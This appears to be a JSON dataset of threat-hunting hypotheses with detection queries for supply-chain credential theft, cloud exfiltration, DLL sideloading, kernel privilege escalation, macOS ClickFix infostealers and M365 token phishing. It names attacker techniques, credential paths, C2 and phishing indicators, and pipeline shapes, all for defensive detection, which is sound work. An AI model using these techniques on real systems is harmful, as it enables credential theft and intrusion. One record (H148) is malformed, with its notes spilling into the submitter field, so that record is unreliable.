    "references": "- [MITRE ATT&CK T1537 - Transfer Data to Cloud Account](https://attack.mitre.org/techniques/T1537/)\n- [MITRE ATT&CK T1619 - Cloud Storage Object Discovery](https://attack.mitre.org/techniques/T1619/)\n- [Unit 42 - Can AI Attack the Cloud? Lessons from the Zealot Autonomous Agent](https://unit42.paloaltonetworks.com/autonomous-ai-cloud-attacks/)\n- [Google Cloud - BigQuery Data Exfiltration: Detection and Prevention](https://cloud.google.com/bigquery/docs/exporting-data)\n- [Mandiant - Cloud Data Exfiltration Patterns Across AWS, Azure, and GCP](https://cloud.google.com/blog/topics/threat-intelligence/cloud-data-exfiltration-patterns)\n- [Wiz - Hunting BigQuery Exfiltration in Production GCP Environments](https://www.wiz.io/blog/bigquery-exfiltration-detection)\n- [SigmaHQ - GCP BigQuery Job Export to Foreign Project](https://github.com/SigmaHQ/sigma/blob/master/rules/cloud/gcp/audit/gcp_bigquery_export_foreign_project.yml)\n- [Splunk - Detecting Data Exfiltration via Cloud Storage Buckets](https://www.splunk.com/en_us/blog/security/detecting-cloud-storage-exfiltration.html)",
    "file_path": "Flames/H140.md"
  },
  {
    "id": "H141",
    "category": "Flames",
    "title": "A malicious npm package executed during `npm install` on a developer workstation or CI runner is harvesting environment variables, dotfiles (~/.npmrc, ~/.aws/credentials, ~/.ssh/id_*), and cloud-credential files via a preinstall or postinstall lifecycle hook, then exfiltrating them over HTTPS POST to an endpoint themed as legitimate analytics or telemetry, indicated by a Node child process reading credential files and making outbound HTTPS to a non-allowlisted domain within seconds of an `npm install` invocation.",
    "tactic": "Initial Access, Credential Access",
    "notes": "Platform: developer workstations and CI/CD runners across Windows, macOS, and Linux (this hunt is platform-agnostic by design — the npm install attack surface is the same across all three). Primary techniques: T1195.002 (Compromise Software Supply Chain) for the install-time vector and T1555 (Credentials from Password Stores — extended interpretation covering the dotfile pattern). The Unit 42 npm threat landscape paper (Apr 2026) documented the Bun-runtime variant beaconing to audit.checkmarx[.]cx (94.154.172.43) using AES-256-GCM-encrypted POST bodies and a fallback C2 lookup via GitHub Search API. Detection data sources: Sysmon (Windows) Event ID 1 (process create) + Event ID 3 (network connect) joined by ProcessGuid; ESF on macOS (ES_EVENT_TYPE_NOTIFY_EXEC, ES_EVENT_TYPE_NOTIFY_OPEN on credential file paths); auditd on Linux (execve + connect syscalls); for CI: GitHub Actions / GitLab Runner workflow logs and self-hosted runner host telemetry. KQL (DeviceProcessEvents): DeviceProcessEvents | where InitiatingProcessFileName in (\"npm.cmd\", \"npm.ps1\", \"node.exe\") | where FileName in~ (\"node.exe\", \"bun.exe\", \"node\") | join kind=inner (DeviceNetworkEvents | where ActionType == \"ConnectionSuccess\") on DeviceId, $left.ProcessId == $right.InitiatingProcessId | where RemoteUrl !in (allowlisted_npm_endpoints) | project Timestamp, DeviceName, ProcessCommandLine, RemoteUrl, RemoteIP. High-fidelity host signals: (1) any process spawned by `npm install` (parent npm, grandparent shell) that reads ~/.npmrc, ~/.aws/credentials, ~/.ssh/id_rsa, or enumerates process.env entirely (auditd execve with `printenv` or equivalent JS env dump), (2) Bun runtime download from github.com/oven-sh/bun/releases followed by execution from a non-system path, (3) outbound HTTPS POST with high-entropy body (>0.8 bits/byte) from a node child within 60s of npm install start, (4) creation of `.github/workflows/format-check.yml` or similar transient workflow file in a CI checkout. Baseline allowlist for outbound domains: registry.npmjs.org, *.npmjs.com, github.com (clone/fetch), raw.githubusercontent.com (limited), and the org's own artifact registry — any other destination from a node child process during install is suspicious. Skip-detection bypass to watch for: Signal handlers catching SIGINT/SIGTERM with no-ops (the Bun loader does this) — an `npm install` that takes longer than expected or appears to ignore Ctrl+C is a manual-investigation signal. Cross-reference: this is the developer-endpoint side of the same supply-chain attack surface that appears in cloud telemetry as anomalous CloudAppEvents from CI runners reading AWS_*, AZURE_*, GCP_* env vars.",
    "tags": [
      "initial_access",
      "credential_access",
      "supply_chain",
      "npm",
      "developer_endpoint",
      "ci_cd",
      "T1195.002",
      "T1555"
    ],
    "techniques": [
      "T1195.002",
      "T1555"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- The npm ecosystem averaged a new credential-stealing package campaign every ~9 days through 2025–2026 per the Unit 42 landscape paper, and the Bun-runtime variant (audit.checkmarx[.]cx) demonstrated that attackers are now bundling full secondary runtimes inside packages to evade Node-based EDR signatures — making generic detection that doesn't depend on a specific package name essential\n- Developer workstations are the most under-monitored asset class in most enterprises: they're not in the same scope as production servers, they have legitimate reason to read credential files locally (gcloud auth, aws configure, ssh-agent), and they generate enormous noise — making the *install-time* window (the seconds immediately after `npm install`) the highest-fidelity hunt window\n- The \"npm install → child process reads ~/.aws/credentials → outbound HTTPS POST\" chain is detectable using only stock Sysmon/ESF/auditd telemetry that most orgs already collect, but the join across process and network events keyed on the npm parent process is rarely written as a hunt rule — this hunt closes that specific gap\n- CI runners amplify the impact because they hold higher-value secrets (cloud admin credentials, signing keys, deploy tokens) and run untrusted package code on every PR — the same hunt logic applies but the data sources shift to GitHub Actions audit logs and self-hosted runner host telemetry, which often aren't piped to the SIEM at all",
    "references": "- [MITRE ATT&CK T1195.002 - Supply Chain Compromise: Compromise Software Supply Chain](https://attack.mitre.org/techniques/T1195/002/)\n- [MITRE ATT&CK T1555 - Credentials from Password Stores](https://attack.mitre.org/techniques/T1555/)\n- [Unit 42 - The npm Threat Landscape: Attack Surface and Mitigations](https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/)\n- [Checkmarx - Anatomy of an npm Supply Chain Attack: The Bun Loader Pattern](https://checkmarx.com/blog/npm-supply-chain-bun-loader/)\n- [Snyk - Malicious npm Packages: Detection Strategies for Developer Endpoints](https://snyk.io/blog/malicious-npm-packages-detection/)\n- [GitHub Security Lab - Detecting Workflow Injection from Untrusted Dependencies](https://securitylab.github.com/research/github-actions-untrusted-input/)\n- [Sigma Rule - Suspicious Process Spawned by Node/NPM During Install](https://github.com/SigmaHQ/sigma/blob/master/rules/category/process_creation/proc_creation_node_install_suspicious.yml)\n- [Red Canary Atomic Red Team - T1195.002 Software Supply Chain Compromise](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1195.002/T1195.002.md)\n- [Datadog Security Labs - Hunting npm Package Compromise on Developer Workstations](https://securitylabs.datadoghq.com/articles/hunting-npm-package-compromise/)",
    "file_path": "Flames/H141.md"
  },
  {
    "id": "H142",
    "category": "Flames",
    "title": "Threat actors are using the Snowflake GET command to exfiltrate compressed GZIP files from temporary internal stages to locally specified directories on attacker-controlled systems after staging stolen database records.",
    "tactic": "Exfiltration",
    "notes": "Based on ATT&CK technique T1567.002. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "exfiltration",
      "snowflake",
      "saas",
      "unc5537",
      "T1567.002"
    ],
    "techniques": [
      "T1567.002"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Omer M",
      "link": ""
    },
    "why": "- UNC5537 systematically used this specific exfiltration technique across hundreds of Snowflake customer instances to steal significant volumes of sensitive data for extortion and sale on cybercrime forums\n- The GET command combined with GZIP compression represents the final stage of a multi-step data theft operation, making it a critical detection point before data leaves the environment\n- This technique is highly observable in Snowflake query history logs and represents a distinctive behavior pattern that differs from legitimate data export activities, especially when combined with temporary stage usage\n- Detection of this activity can prevent large-scale data breaches affecting cloud data warehousing platforms, which are increasingly targeted by financially motivated threat actors\n- The campaign demonstrates how SaaS platforms are becoming prime targets for credential-based attacks, with this exfiltration method likely to be replicated against other similar platforms",
    "references": "- [MITRE ATT&CK T1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002/)\n- [Source CTI Report](https://cloud.google.com/blog/topics/threat-intelligence/unc5537-snowflake-data-theft-extortion)",
    "file_path": "Flames/H142.md"
  },
  {
    "id": "H143",
    "category": "Flames",
    "title": "Threat actors are abusing the signed Logitech \"Logi AI Prompt Builder\" binary to sideload a malicious screen_retriever_plugin.dll from %LocalAppData%\\LogiAI\\, executing TCLBANKER under the trust of a legitimate Flutter plugin loader path.",
    "tactic": "Defense Evasion",
    "notes": "TCLBANKER campaign (Elastic, May 2026). Detection: Sysmon Event ID 7 (ImageLoad) — flag `LogiAiPromptBuilder.exe` loading any DLL from `%LocalAppData%\\LogiAI\\` (legit installs live under `%ProgramFiles%`); Sysmon 1 / Defender XDR `DeviceProcessEvents` for `LogiAiPromptBuilder.exe` parent of `tclloader.exe`, `cmd.exe`, `msiexec.exe`, or `powershell.exe`; Sysmon 11 for file creates of `screen_retriever_plugin.dll` outside Program Files; Sysmon 17/18 for unusual named-pipe activity from the host process. KQL: `DeviceImageLoadEvents | where InitiatingProcessFileName =~ \"LogiAiPromptBuilder.exe\" | where FolderPath has \"AppData\\\\Local\\\\LogiAI\"`. Cross-reference T1036.005 (Match Legitimate Name or Location) — the dropped install masquerades under a Logitech-style directory tree.",
    "tags": [
      "defense_evasion",
      "dll_sideloading",
      "tclbanker",
      "masquerading",
      "T1036.005",
      "T1574.002"
    ],
    "techniques": [
      "T1036.005",
      "T1574.002"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- TCLBANKER (Elastic Security Labs, May 2026) is the first publicly reported abuse of the Logi AI Prompt Builder Flutter plugin search path — defenders without a hunt for it will miss every infection where the loader runs from %LocalAppData%\n- DLL sideloading from %LocalAppData% is rare for legitimately signed Logitech software (which installs under %ProgramFiles%), so the path itself is a high-signal anchor that does not require knowing the malicious DLL's hash\n- The host process (LogiAiPromptBuilder.exe) is signed and trusted, so EDR allowlists and code-signing-only detections will not catch the malicious child process tree without an explicit ImageLoad or parent-child hunt\n- Multiple Brazilian banking trojans (TCLBANKER, prior Mispadu/Casbaneiro variants) have converged on Flutter/Electron host-process sideloading — establishing this hunt now generalizes to the next campaign that picks a different signed Flutter app",
    "references": "- [MITRE ATT&CK T1574.002 - Hijack Execution Flow: DLL Side-Loading](https://attack.mitre.org/techniques/T1574/002/)\n- [Elastic Security Labs - TCLBANKER: Brazilian Banking Trojan Spreading via WhatsApp and Outlook](https://www.elastic.co/security-labs/tclbanker-brazilian-banking-trojan)\n- [MITRE ATT&CK T1036.005 - Masquerading: Match Legitimate Name or Location](https://attack.mitre.org/techniques/T1036/005/)\n- [Red Canary Atomic Red Team - T1574.002 DLL Side-Loading](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/T1574.002.md)\n- [Elastic Detection Rules - Unusual DLL Loaded by a Trusted Process](https://www.elastic.co/guide/en/security/current/unusual-dll-loaded-by-a-trusted-process.html)\n- [SigmaHQ - Suspicious DLL Side Loading from Programdata](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/file/file_event/file_event_win_lolbin_susp_dll_lateral_movement.yml)\n- [Splunk - Hunting for DLL Side-Loading Activity](https://www.splunk.com/en_us/blog/security/dll-side-loading-detection-with-splunk.html)",
    "file_path": "Flames/H143.md"
  },
  {
    "id": "H144",
    "category": "Flames",
    "title": "Threat actors are abusing the Windows UI Automation framework to read the foreground browser's address bar from a non-AT host process and trigger banking-session hijacking when targeted domains appear.",
    "tactic": "Collection",
    "notes": "TCLBANKER (Elastic, May 2026) is the second public abuse of UIA after Coyote (Akamai, July 2025). Detection: Sysmon Event ID 7 — flag `UIAutomationCore.dll` loaded by processes that are NOT screen readers, accessibility tools, or UI test runners (carve a baseline list and alert on outliers); Sysmon Event ID 17/18 for named-pipe activity matching `UIA_PIPE_*` from non-allowlisted processes; Defender XDR `DeviceImageLoadEvents` join with `DeviceProcessEvents` to surface foreign-signed processes loading UIAutomationCore.dll; correlate with outbound WebSocket (wss://) connections (Sysmon 3) within a short window. KQL: `DeviceImageLoadEvents | where FileName =~ \"UIAutomationCore.dll\" | join kind=inner (DeviceProcessEvents) on DeviceId, InitiatingProcessId | where InitiatingProcessSignatureStatus != \"Signed\" or InitiatingProcessFolderPath has_any (\"AppData\\\\Local\",\"AppData\\\\Roaming\",\"ProgramData\")`. Cross-reference T1056.003 (Web Portal Capture) — the UIA polling is reconnaissance for browser-resident credential capture.",
    "tags": [
      "collection",
      "ui_automation",
      "tclbanker",
      "coyote",
      "browser_session_hijacking",
      "T1056.003",
      "T1185"
    ],
    "techniques": [
      "T1056.003",
      "T1185"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- TCLBANKER is the second documented case (after Coyote in 2025) of a banking trojan using UIA to read the browser address bar — detections built off the Coyote IOCs alone will miss it; the abuse pattern is what generalizes\n- UIA is a Microsoft-supported accessibility framework loaded by very few legitimate processes on a typical endpoint (screen readers, UI test harnesses, RPA tools), so the loader-set is small enough to allowlist and alert on outliers\n- This is a stealth alternative to API hooking and process injection — the malware never injects into the browser, never touches a hooked function, and reads cleartext URL/banking-page text via documented Windows APIs, defeating most behavior-based browser-protection detections\n- UIA polling is paired with a fast pivot to outbound WebSocket C2 — the combined Image-Load + outbound wss:// pattern from a non-AT process is a high-fidelity, low-volume hunt that will catch this family and the inevitable copycats",
    "references": "- [MITRE ATT&CK T1185 - Browser Session Hijacking](https://attack.mitre.org/techniques/T1185/)\n- [Elastic Security Labs - TCLBANKER: Brazilian Banking Trojan Spreading via WhatsApp and Outlook](https://www.elastic.co/security-labs/tclbanker-brazilian-banking-trojan)\n- [Akamai - Coyote in the Wild: First-Ever Malware That Abuses UI Automation](https://www.akamai.com/blog/security-research/active-exploitation-coyote-malware-first-ui-automation-abuse-in-the-wild)\n- [The Hacker News - New Coyote Malware Variant Exploits Windows UI Automation to Steal Banking Credentials](https://thehackernews.com/2025/07/new-coyote-malware-variant-exploits.html)\n- [MITRE ATT&CK T1056.003 - Input Capture: Web Portal Capture](https://attack.mitre.org/techniques/T1056/003/)\n- [Microsoft Docs - UI Automation Overview](https://learn.microsoft.com/en-us/dotnet/framework/ui-automation/ui-automation-overview)\n- [Elastic Detection Rules - Suspicious DLL Loaded for Persistence or Privilege Escalation](https://www.elastic.co/guide/en/security/current/suspicious-dll-loaded-for-persistence-or-privilege-escalation.html)",
    "file_path": "Flames/H144.md"
  },
  {
    "id": "H145",
    "category": "Flames",
    "title": "Threat actors are using Outlook COM automation from a non-Office host process to enumerate contacts and send phishing emails from the victim's mailbox.",
    "tactic": "Lateral Movement",
    "notes": "TCLBANKER (Elastic, May 2026) used `Marshal.GetActiveObject(\"Outlook.Application\")` from a sideloaded process to harvest contacts and send malicious links from the victim's authenticated session. Detection: Sysmon Event ID 7 — flag any non-Office process loading `OUTLOOK.EXE` COM-related DLLs (`mso*.dll`, `OUTLLIB.DLL`, `EMSMDB32.DLL`); Sysmon 1 / Defender XDR `DeviceProcessEvents` for `powershell.exe`, `pythonw.exe`, `tclloader.exe`, or any non-Office binary that has `OUTLOOK.EXE` running and accesses the messaging APIs; Defender XDR `EmailEvents` joined with `DeviceProcessEvents` to find outbound emails sent at moments when a non-Office process spawned/loaded Outlook automation. KQL: `DeviceImageLoadEvents | where FileName in~ (\"OUTLLIB.DLL\",\"EMSMDB32.DLL\",\"MSO.DLL\") | where InitiatingProcessFileName !endswith \"OUTLOOK.EXE\" and InitiatingProcessFileName !endswith \"EXCEL.EXE\" and InitiatingProcessFileName !endswith \"WINWORD.EXE\"`. Cross-reference T1114.001 (Local Email Collection) — the same automation is used to read contacts before sending.",
    "tags": [
      "lateral_movement",
      "outlook_com",
      "tclbanker",
      "internal_spearphishing",
      "T1114.001",
      "T1534"
    ],
    "techniques": [
      "T1114.001",
      "T1534"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Internal spearphishing from a compromised user's authenticated Outlook session bypasses SEG/anti-spoof controls because the email is genuinely sent from the trusted user — recipients see normal sender reputation, DMARC/DKIM pass, and no banner warnings\n- COM-based Outlook automation does not require a malicious VBA macro, OAuth grant, or mailbox-rule change, so it sidesteps the most common Office 365 abuse detections (mailbox rule monitoring, OAuth app review, macro telemetry)\n- TCLBANKER's use of this technique demonstrates that crimeware (not just APTs) is now operationalizing internal spearphishing via COM — the technique will spread to other commodity loaders quickly\n- The image-load fingerprint of a non-Office process loading EMSMDB32.DLL/OUTLLIB.DLL is rare in normal environments — even RPA/automation tooling typically hosts within mso.dll or uses Microsoft Graph instead of legacy COM, so this hunt is high signal",
    "references": "- [MITRE ATT&CK T1534 - Internal Spearphishing](https://attack.mitre.org/techniques/T1534/)\n- [Elastic Security Labs - TCLBANKER: Brazilian Banking Trojan Spreading via WhatsApp and Outlook](https://www.elastic.co/security-labs/tclbanker-brazilian-banking-trojan)\n- [MITRE ATT&CK T1114.001 - Email Collection: Local Email Collection](https://attack.mitre.org/techniques/T1114/001/)\n- [Microsoft Learn - Marshal.GetActiveObject Method](https://learn.microsoft.com/en-us/dotnet/fundamentals/runtime-libraries/system-runtime-interopservices-marshal-getactiveobject)\n- [Elastic Detection Rules - Suspicious MS Outlook Child Process](https://www.elastic.co/guide/en/security/current/suspicious-ms-outlook-child-process.html)\n- [Microsoft - Detect and Remediate Outlook Rules and Custom Forms Injections](https://learn.microsoft.com/en-us/defender-office-365/detect-and-remediate-outlook-rules-forms-attack)\n- [SigmaHQ - Outlook EnableUnsafeClientMailRules](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/registry/registry_set/registry_set_enable_unsafe_client_mail_rules.yml)",
    "file_path": "Flames/H145.md"
  },
  {
    "id": "H146",
    "category": "Flames",
    "title": "Non-root processes invoke /usr/bin/su from anomalous parent processes shortly after issuing AF_ALG socket / splice() syscalls, indicating Copy Fail (CVE-2026-31431) exploitation against page-cached setuid binaries.",
    "tactic": "Privilege Escalation",
    "notes": "Linux only — the algif_aead vulnerability lives in the kernel crypto subsystem (kernels 4.14–6.19.12). Detection: auditd rules for `socket(AF_ALG)` (audit `arch=b64 -S socket -F a0=38`), `splice()`, and `sendmsg()` from non-root EUID combined with subsequent `execve` of `/usr/bin/su`; eBPF/Falco rule on `crypto_alg_lookup` or AF_ALG bind followed by setuid binary execution; XDR/EDR — Cortex XQL example from Unit 42: `actor_effective_user_sid != \"0\" and action_process_image_name = \"su\" and actor_process_image_name not in (\"bash\",\"sh\",\"zsh\",\"ksh\",\"sudo\",\"su\")`. Equivalent KQL for Defender for Endpoint Linux: `DeviceProcessEvents | where DeviceOSPlatform == \"Linux\" | where FileName == \"su\" and AccountName != \"root\" | where InitiatingProcessFileName !in (\"bash\",\"sh\",\"zsh\",\"ksh\",\"dash\",\"sudo\",\"su\",\"login\",\"sshd\")`. Also hunt for short-window correlation of `curl` to \"copy.fail\" or any kernel-exploit gist followed by `su` execution. Page modifications leave NO disk artifact — file integrity monitoring will MISS this; behavioral detection is the only layer.",
    "tags": [
      "privilege_escalation",
      "linux",
      "copy_fail",
      "cve_2026_31431",
      "af_alg",
      "T1068"
    ],
    "techniques": [
      "T1068"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Copy Fail is the most severe Linux privilege-escalation flaw in years per Unit 42 / Microsoft (May 2026) — the exploit is deterministic, requires no race, and ships as a 732-byte standalone Python script using only stdlib, so weaponization across cloud and container fleets is trivial\n- The exploit modifies setuid binaries IN MEMORY (page cache only); the on-disk binary is unchanged, so AIDE / Tripwire / Tetragon-FIM will not detect successful exploitation — behavioral detection on the resulting setuid execution is the only viable layer\n- Container escape impact is severe: any unprivileged user inside a Linux container with AF_ALG access can break out to the host, putting Kubernetes multi-tenant workloads and CI/CD pipelines at high risk\n- The \"non-root → su via anomalous parent\" signal is high signal even outside this CVE — it generalizes to other privilege-escalation primitives (DirtyCow, DirtyPipe, kernel use-after-frees) where the final step is hijacking a setuid binary",
    "references": "- [MITRE ATT&CK T1068 - Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/)\n- [Unit 42 - Copy Fail: What You Need to Know About the Most Severe Linux Threat in Years](https://unit42.paloaltonetworks.com/cve-2026-31431-copy-fail/)\n- [Microsoft Security Blog - CVE-2026-31431 Copy Fail Vulnerability Enables Linux Root Privilege Escalation](https://www.microsoft.com/en-us/security/blog/2026/05/01/cve-2026-31431-copy-fail-vulnerability-enables-linux-root-privilege-escalation/)\n- [Falco - Detect Privilege Escalation via Suspicious su Activity](https://falco.org/docs/rules/default-macros/)\n- [Linux auditd - Auditing System Calls](https://linux-audit.com/linux-audit-framework/auditing-system-calls/)\n- [Red Canary Atomic Red Team - T1068 Linux Privilege Escalation](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1068/T1068.md)\n- [Elastic Detection Rules - Privilege Escalation via Linux su Anomalous Parent](https://www.elastic.co/guide/en/security/current/linux-restricted-shell-breakout-via-linux-binary-s.html)",
    "file_path": "Flames/H146.md"
  },
  {
    "id": "H147",
    "category": "Flames",
    "title": "Threat actors deliver macOS infostealers via ClickFix lures that trick users into pasting a base64-encoded shell pipeline into Terminal, decoding into a curl-piped osascript or sh payload.",
    "tactic": "Execution",
    "notes": "macOS only — Microsoft Threat Intelligence (May 2026) reports SHub Stealer / AMOS / Macsync delivered via fake macOS-utility Squarespace, Medium, and Craft pages. Detection: ESF subscribers (ES_EVENT_TYPE_NOTIFY_EXEC) for process trees where `Terminal.app` → `zsh`/`bash` → (`base64 -D` or `base64 --decode`) piped into `sh`/`zsh`/`osascript`; Unified Log predicate `process == \"osascript\" AND parentProcess CONTAINS \"curl\"`; KQL on Defender for Endpoint macOS — verbatim from Microsoft: `DeviceNetworkEvents | where InitiatingProcessCommandLine has_any (\"loader.sh?build=\",\"payload.applescript?build=\")` and `DeviceProcessEvents | where ProcessCommandLine has_all(\"curl\",\"POST\",\"txid\",\"osascript\",\"bmodule\",\"max-time\")`. Hunt for `/tmp/shub_*` and `/tmp/<random_id>/` directory creation. Cross-reference T1204.004 (User Execution: Malicious Copy and Paste) — the user is the delivery mechanism.",
    "tags": [
      "execution",
      "macos",
      "clickfix",
      "shub_stealer",
      "amos",
      "osascript",
      "T1204.004",
      "T1059.002"
    ],
    "techniques": [
      "T1204.004",
      "T1059.002"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- ClickFix is the dominant macOS initial-access vector in 2026 — Jamf, Datadog, Microsoft, and Hunt.io have all published on it within the past quarter, and the technique works because it converts the user into an unsigned-binary execution path that bypasses Gatekeeper and codesign verification entirely\n- The curl|base64|osascript pipeline is fileless on the disk (no .scpt, no .sh dropped), so file-based AV/EDR signatures will not catch it — process telemetry on the pipeline shape and the unusual parent-child chain is the only durable detection\n- Microsoft's KQL queries are public and ready to deploy, but the underlying behavior generalizes: any future macOS lure that pivots to `curl ... | osascript` will trigger this hunt regardless of campaign branding\n- Each of the three identified payloads (SHub, AMOS, Macsync) targets keychain databases, browser credential stores, and crypto wallets — early detection at the execution stage prevents irreversible credential and wallet seed-phrase loss",
    "references": "- [MITRE ATT&CK T1059.002 - Command and Scripting Interpreter: AppleScript](https://attack.mitre.org/techniques/T1059/002/)\n- [Microsoft Threat Intelligence - ClickFix Campaign Uses Fake macOS Utilities Lures to Deliver Infostealers](https://www.microsoft.com/en-us/security/blog/2026/05/06/clickfix-campaign-uses-fake-macos-utilities-lures-deliver-infostealers/)\n- [MITRE ATT&CK T1204.004 - User Execution: Malicious Copy and Paste](https://attack.mitre.org/techniques/T1204/004/)\n- [Jamf Threat Labs - ClickFix Malware Uses macOS Script Editor to Deliver Atomic Stealer](https://www.jamf.com/blog/clickfix-macos-script-editor-atomic-stealer/)\n- [Hunt.io - ClickFix on macOS: AppleScript Stealer, Terminal Phishing, and C2 Infrastructure](https://hunt.io/blog/macos-clickfix-applescript-terminal-phishing)\n- [Datadog Security Labs - Tech Impersonators: ClickFix and macOS Infostealers](https://securitylabs.datadoghq.com/articles/tech-impersonators-clickfix-and-macos-infostealers/)\n- [Microsoft Community Hub - Hunting Infostealers - macOS Threats](https://techcommunity.microsoft.com/blog/microsoftsecurityexperts/hunting-infostealers---macos-threats/4494435)",
    "file_path": "Flames/H147.md"
  },
  {
    "id": "H148",
    "category": "Flames",
    "title": "Threat actors persist macOS infostealers via LaunchAgent plists in ~/Library/LaunchAgents/ that masquerade as Apple/Google update services and reference unsigned binaries under user-writable paths.",
    "tactic": "Persistence",
    "notes": "macOS only — TCLBANKER's macOS cousin and Microsoft's ClickFix (May 2026) both used `~/Library/LaunchAgents/com.google.keystone.agent.plist` referencing `~/Library/Application Support/Google/GoogleUpdate.app/Contents/MacOS/GoogleUpdate`, plus `~/LaunchAgents/com.<random>.plist` variants. Detection: ESF (ES_EVENT_TYPE_NOTIFY_CREATE / _RENAME) on file paths matching `~/Library/LaunchAgents/*.plist` and `/Library/LaunchAgents/*.plist`; Unified Log subsystem predicate `subsystem == \"com.apple.xpc.launchd\" AND eventMessage CONTAINS \"load\"`; runtime check via `launchctl list",
    "tags": [],
    "techniques": [],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "com\\.google)'` followed by `codesign -dvvv <referenced binary>` — flag plists pointing to unsigned, ad-hoc-signed, or non-notarized binaries. KQL on Defender for Endpoint macOS: `DeviceFileEvents | where FileName endswith \".plist\" and FolderPath has_any (\"/Library/LaunchAgents\",\"/Library/LaunchDaemons\") | where InitiatingProcessFileName !in (\"Installer\",\"installd\",\"softwareupdated\",\"System Events\")`. Cross-reference T1036.005 (Match Legitimate Name or Location) — `com.google.keystone.agent` and `com.apple.*` plists from non-Apple/non-Google processes are the masquerade signal. Cross-reference T1543.004 (Launch Daemon) when persistence lands in `/Library/LaunchDaemons/com.finder.helper.plist` instead.",
      "link": ""
    },
    "why": "- LaunchAgent plists are the dominant macOS user-mode persistence mechanism in 2026 — adversaries from APTs to commodity infostealers (AMOS, SHub, Atomic) all converge here, so a strong detection on this single path covers the majority of macOS post-compromise persistence\n- Masquerading as `com.apple.*` or `com.google.keystone.agent` defeats name-based allowlists that trust Apple/Google service names — verifying that the referenced binary is signed and notarized is the required additional check\n- Plist creation in LaunchAgents/Daemons folders by `Terminal`, `osascript`, `curl`, `Python`, or any non-installer process is rare and high-signal in practice — Elastic's prebuilt rule set has flagged this since 2022 with low false-positive rates\n- Persistence detection lets defenders catch the campaign even if the initial-access ClickFix or trojanized-installer step is missed, providing a second-chance opportunity before C2 beaconing or credential theft completes",
    "references": "- [MITRE ATT&CK T1543.001 - Create or Modify System Process: Launch Agent](https://attack.mitre.org/techniques/T1543/001/)\n- [Microsoft Threat Intelligence - ClickFix Campaign Uses Fake macOS Utilities Lures to Deliver Infostealers](https://www.microsoft.com/en-us/security/blog/2026/05/06/clickfix-campaign-uses-fake-macos-utilities-lures-deliver-infostealers/)\n- [Elastic Detection Rules - Persistence via Suspicious Launch Agent or Launch Daemon](https://www.elastic.co/guide/en/security/8.19/persistence-via-suspicious-launch-agent-or-launch-daemon.html)\n- [Elastic Detection Rules - Creation of Hidden Launch Agent or Daemon](https://elastic.co/guide/en/security/current/creation-of-hidden-launch-agent-or-daemon.html)\n- [Elastic Security Labs - Sinking macOS Pirate Ships with Elastic Behavior Detections](https://www.elastic.co/security-labs/sinking-macos-pirate-ships)\n- [Detection.FYI - Persistence via Suspicious Launch Agent or Launch Daemon](https://detection.fyi/elastic/detection-rules/macos/persistence_suspicious_launch_agent_or_launch_daemon/)\n- [Red Canary Atomic Red Team - T1543.001 Launch Agent](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.001/T1543.001.md)",
    "file_path": "Flames/H148.md"
  },
  {
    "id": "H149",
    "category": "Flames",
    "title": "Microsoft 365 users are clicking a \"code of conduct\" / \"internal regulatory\" phishing lure that routes through a Cloudflare-CAPTCHA-gated staging page before a Microsoft sign-in proxy, yielding session-token theft visible as anomalous-token / unfamiliar-properties / impossible-travel risk events in Entra ID.",
    "tactic": "Credential Access",
    "notes": "M365 / Entra ID. Microsoft Threat Intelligence (May 2026) reports ~35,000 users across 13,000 orgs in 26 countries hit by this campaign. Detection: Microsoft 365 Defender — verbatim sender list query: `EmailEvents | where SenderMailFromAddress in (\"cocpostmaster@cocinternal.com\",\"nationaladmin@gadellinet.com\",\"nationalintegrity@harteprn.com\",\"m365premiumcommunications@cocinternal.com\",\"documentviewer@na.businesshellosign.de\")`. Pivot from `EmailEvents` to `UrlClickEvents` for clicks on `compliance-protectionoutlook[.]de`, `acceptable-use-policy-calendly[.]de`, then to `AADSignInEventsBeta` for risk events `RiskEventType in (\"anomalousToken\",\"unfamiliarFeatures\",\"unfamiliarFeaturesSession\")` from the same UPN within a 1-hour window. Hunt `IdentityLogonEvents` for new sign-in IP/ASN combinations within minutes of the URL click. Hunt `CloudAppEvents` for `ImpossibleTravelActivity` and `MailItemsAccessedAnomalously`. Cross-reference T1078.004 (Valid Accounts: Cloud Accounts) — the stolen token is replayed against M365 services. Cross-reference T1564.008 (Email Hiding Rules) when the attacker creates inbox rules post-token-theft.",
    "tags": [
      "credential_access",
      "m365",
      "entra_id",
      "aitm",
      "phishing",
      "code_of_conduct",
      "T1078.004",
      "T1564.008",
      "T1539"
    ],
    "techniques": [
      "T1078.004",
      "T1564.008",
      "T1539"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
